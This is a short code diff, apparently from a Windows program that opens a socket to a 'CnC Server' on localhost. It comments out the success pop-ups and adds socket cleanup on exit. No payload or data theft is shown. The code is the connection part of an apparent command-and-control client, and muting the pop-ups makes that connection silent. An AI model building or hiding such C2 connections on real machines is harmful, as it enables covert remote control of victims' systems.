@@ -168,11 +168,11 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
             WSACleanup();
             TerminateProcess(GetCurrentProcess(), 0);
         }
-        MessageBox(hWnd, L"socket succeed..", L"성공", NULL);
+        //MessageBox(hWnd, L"socket succeed..", L"성공", NULL);
 
         memset(&servAddr, 0x00, sizeof(servAddr));
         servAddr.sin_family = AF_INET;
-        servAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // CnC Server IP address 
+        servAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // CnC Server IP address
         servAddr.sin_port = htons(PortNumber); // CnC Server Port Number
 
         if (connect(hSocket, (SOCKADDR*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
@@ -183,7 +183,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
             TerminateProcess(GetCurrentProcess(), 0);
         }else
         {
-            MessageBox(hWnd, L"connect succeed..", L"성공", NULL);
+            //MessageBox(hWnd, L"connect succeed..", L"성공", NULL);
         }
     }
         break;
@@ -214,6 +214,8 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
                 DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                 break;
             case IDM_EXIT:
+                WSACleanup();
+                closesocket(hSocket);
                 DestroyWindow(hWnd);
                 break;
             default:
